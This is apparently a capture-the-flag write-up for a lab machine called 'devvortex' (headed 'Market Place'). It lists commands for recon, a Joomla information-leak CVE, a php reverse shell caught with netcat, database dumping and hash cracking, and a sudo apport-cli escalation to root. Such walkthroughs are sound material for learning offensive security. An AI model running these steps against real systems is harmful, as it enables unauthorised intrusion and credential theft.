# - MARKET PLACE WRITEUP-

```
SETUP

> Add IP to host file in /etc/hosts
> IP devvortex.htb
```

## Reconnaissance

1. Find the open ports
    - `sudo nmap -sV IP`

2. Enumerate the subdomains
    - `gobuster dns -d devvortex.htb -w wordlist.txt`

3. Identify the subdomain of `dev` adding it to host and enumerating directories
    - `dirsearch -u http://devvortex.htb`

4. Visit the /administration page and see login page runs on joomla

## Enumeration
5. Check for joomla [CVE](https://feedly.com/cve/CVE-2023-23752) exploits and find the following
    - `curl -v http://IP/api/index.php/v1/config/application?public=true | jq` ([Explanation](https://github.com/Pushkarup/CVE-2023-23752))

6. See in the JSON the password for `lewis`
7. Log in as lewis on the adminstration panel
8. Make your way across admin page where you can modify individual webpages, including index.php

## Escalation
9. Listen on port 4444: 
    - `nc -lvnp 4444`
    - Submit a php reverse shell
        - exec()
        - click Save and Close
10. Should now have a reverse shell into the server as `www-data`
11. Upgrade our shell: 
    - `script /dev/null -c /bin/bash`
    - Ctrl + Z
    - `stty raw -echo; fg`
    - Press Enter twice
    - `export TERM=xterm`
12. Returning to the CVE results we can see mysqli is running
13. Connect to the mysql server: `mysql -u lewis -p`
    - Enter previous password
    - `SHOW DATABASES;`
    - `USE joomla;`
    - `SHOW TABLES;`
    - `SELECT * FROM sd4fg_users;`
14. Use John the Ripper to crack the Bcrypt password for Logan's row as he is a user in home directory
15. `ssh logan@IP` & `cat user.txt`
16. SEE WHAT WE CAN RUN AS SUDO
    - `sudo -l`
    - Find /usr/bin/apport-cli

17. Run apport-cli and see it lets you view crash files
    - generate a file with `-f` flag and then once selected stuff press `V`

18. It is a vi shell so you can launch bash with 
    - [`!/bin/bash`](https://github.com/diego-tella/CVE-2023-1326-PoC)

19. With ROOT you can now get the root.txt file using 
    - `find / -name root.txt 2>/dev/null`

